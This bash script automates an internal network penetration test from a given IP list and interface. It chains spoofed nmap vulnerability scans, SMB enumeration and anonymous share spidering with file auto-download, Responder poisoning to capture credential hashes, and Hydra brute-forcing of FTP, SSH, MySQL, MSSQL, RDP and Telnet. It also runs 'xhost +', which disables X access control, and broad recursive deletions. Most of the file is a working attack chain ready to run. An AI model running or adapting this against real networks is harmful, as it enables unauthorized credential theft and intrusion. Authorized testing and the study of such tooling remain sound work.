#!/bin/bash

xhost +

rm -r .cache/ .config/ .gnome2* .mozilla/ .python-eggs/ .recon-ng/ .zenmap/ Desktop/ hydra.restore includes/yasuo/*.log
clear

if [[ $# -ne 2 ]] ; then
    echo -e "Usage: $0 <IP list> <network interface>\n"
    echo "<ip list>           = File containing IPs or CIDR ranges: one per line."
    echo "<network interface> = eth0, wlan0, etc. thatis connected to the network you wish to scan."
    exit 0
fi

HOME=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
DUMP_LOCATION='scan_results'
NETWORK=$1
INTERFACE=$2
SCAN_RESULTS_LOCATION="$HOME/$DUMP_LOCATION/$NETWORK"

rm -r $SCAN_RESULTS_LOCATION

if [ ! -d $SCAN_RESULTS_LOCATION ]; then
	mkdir -p $SCAN_RESULTS_LOCATION;
fi

# VLAN Hopping Scan
echo $INTERFACE | $HOME/includes/dtpscan/dtpscan.sh | tee $SCAN_RESULTS_LOCATION/DTPScan_VLAN.txt

#Port Scanning to enum all live hosts
#nmap -e $INTERFACE -v --open -T4 -Pn -n -sS -F -oG /tmp/tcp.gnmap -iL $HOME/$NETWORK
#nmap -e $INTERFACE -v --open -T4 -Pn -n -sY -F -oG /tmp/sctp.gnmap -iL $HOME/$NETWORK
#nmap -e $INTERFACE -v --open -T4 -Pn -n -sU -p53,69,111,123,137,161,500,514,520 -oG /tmp/udp.gnmap -iL $HOME/$NETWORK
#grep Host /tmp/*.gnmap | awk '{print $2}' | sort | uniq > $HOME/$NETWORK

#UDP Scan on live hosts
nmap -e $INTERFACE --randomize-hosts --spoof-mac=cisco -iL $HOME/$NETWORK -v -T4 --open -Pn -n -sU -sV -oA $SCAN_RESULTS_LOCATION/${NETWORK}_udp --source-port=53 --script=default,safe -p53,67-69,11,123,135,137-139,161-162,445,500,514,520,631,996-999,1434,1701,1900,3283,4500,5353,49152-49154

#TCP Scan on live hosts
nmap -e $INTERFACE --randomize-hosts --spoof-mac=cisco -iL $HOME/$NETWORK -v -T4 --open -Pn -n -sT -sV -oA $SCAN_RESULTS_LOCATION/$NETWORK --source-port=20 --script=broadcast,discovery,default,safe,vuln,auth --top-ports=5000

#Create HTML of Nmap Scan Results
xsltproc $SCAN_RESULTS_LOCATION/$NETWORK.xml -o $SCAN_RESULTS_LOCATION/$NETWORK.html
xsltproc $SCAN_RESULTS_LOCATION/${NETWORK}_udp.xml -o $SCAN_RESULTS_LOCATION/${NETWORK}_udp.html

#Parse Nmap results for PeepingTom and service brute forcing
echo 'y' | $HOME/includes/gnmapparser.sh -g $SCAN_RESULTS_LOCATION/
mv $HOME/Parsed-Results/ $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/

#Parse Nmap for report table on Nmap results
python $HOME/includes/parse_nmap.py -f $SCAN_RESULTS_LOCATION/$NETWORK.xml

#ICMP Scanning
mkdir -p $SCAN_RESULTS_LOCATION/hping3_results/

for i in $(cat $HOME/$NETWORK)
do
	hping3 --scan known -S $i > $SCAN_RESULTS_LOCATION/hping3_results/hping3_$i.txt
done

# USE EYE WITNESS HERE.. screesnhot web + vnc + rdp
cd $HOME/includes/EyeWitness/
./EyeWitness.py -x $SCAN_RESULTS_LOCATION/$NETWORK.xml --headless -d $SCAN_RESULTS_LOCATION/EyeWhitnessWeb1 --no-prompt --active-scan --prepend-https
./EyeWitness.py -x $SCAN_RESULTS_LOCATION/$NETWORK.xml --web -d $SCAN_RESULTS_LOCATION/EyeWhitnessWeb2 --no-prompt --active-scan --prepend-https
./EyeWitness.py -x $SCAN_RESULTS_LOCATION/$NETWORK.xml --rdp -d $SCAN_RESULTS_LOCATION/EyeWhitnessRDP --no-prompt --active-scan
./EyeWitness.py -x $SCAN_RESULTS_LOCATION/$NETWORK.xml --vnc -d $SCAN_RESULTS_LOCATION/EyeWhitnessVNC --no-prompt --active-scan
mkdir -p $SCAN_RESULTS_LOCATION/EyeWhitness
mv $SCAN_RESULTS_LOCATION/EyeWhitnessWeb* $SCAN_RESULTS_LOCATION/EyeWhitnessRDP $SCAN_RESULTS_LOCATION/EyeWhitnessVNC $SCAN_RESULTS_LOCATION/EyeWhitness/
cd $HOME

#enum4linux
mkdir -p $SCAN_RESULTS_LOCATION/enum4linux/
cat $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/445-TCP.txt > /tmp/smb1
cat $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/139-TCP.txt >> /tmp/smb1
cat /tmp/smb1 | sort -u > /tmp/smb
for i in $(cat /tmp/smb)
do
	enum4linux $i | tee $SCAN_RESULTS_LOCATION/enum4linux/$i.txt
done

#Clean
mkdir $SCAN_RESULTS_LOCATION/nmap_results
mv $SCAN_RESULTS_LOCATION/*.{gnmap,nmap,xls,xml,html} $SCAN_RESULTS_LOCATION/nmap_results/
cp $HOME/$NETWORK $SCAN_RESULTS_LOCATION/
rm -r $HOME/Desktop

#SMB Spider
smbtree -N -b > /tmp/shares
cat /tmp/shares | grep -P "\t\t\\\\" | cut -d$'\t' -f3 | cut -d '\' -f1-4  | sed 's/ +//' | sort -u > /tmp/shares2
mv /tmp/shares2 /tmp/shares
sed -i 's/[ \t]*$//' "$1" /tmp/shares
sed -i 's/$/\\/' /tmp/shares
includes/smbspider.py -h /tmp/shares -u anonymous -p anonymous -g includes/smb_autodownload.txt | tee smbspider_output.txt
mkdir -p $SCAN_RESULTS_LOCATION/smb
mv smb* $SCAN_RESULTS_LOCATION/smb/

# Yasuo scan
cd includes/yasuo/
./yasuo.rb -f $SCAN_RESULTS_LOCATION/nmap_results/$NETWORK.xml -b all > $SCAN_RESULTS_LOCATION/yasuo.txt
cd $HOME

#Run Responder
cd includes/Responder/
python ./Responder.py -I $INTERFACE
mkdir -p $SCAN_RESULTS_LOCATION/Responder_data
cd logs
for FILENAME in *; do mv $FILENAME $FILENAME.txt; done 
mv * $SCAN_RESULTS_LOCATION/Responder_data/

cd $HOME
#Brute Force attacks
mkdir -p $SCAN_RESULTS_LOCATION/bruteforced_creds
hydra -C $HOME/users+password.txt -f -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/21-TCP.txt ftp -t1 -W1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ftp.txt
hydra -C $HOME/users+password.txt -f -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/22-TCP.txt ssh -t1 -W1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ssh.txt
hydra -C $HOME/users+password.txt -f -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/3306-TCP.txt mysql -t1 -W1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/mysql.txt
hydra -C $HOME/users+password.txt -f -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/1433-TCP.txt mssql -t1 -W1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/mssql.txt
hydra -C $HOME/users+password.txt -f -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/3389-TCP.txt rdp -t1 -W1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/rdp.txt
hydra -C $HOME/users+password.txt -f -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/23-TCP.txt telnet -t1 -W1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/telnet.txt

#Open results in IceWeasel
firefox &
sleep 2
firefox -new-tab $SCAN_RESULTS_LOCATION/ &
sleep 2
#Open Zenmap
zenmap $SCAN_RESULTS_LOCATION/nmap_results/$NETWORK.xml & 
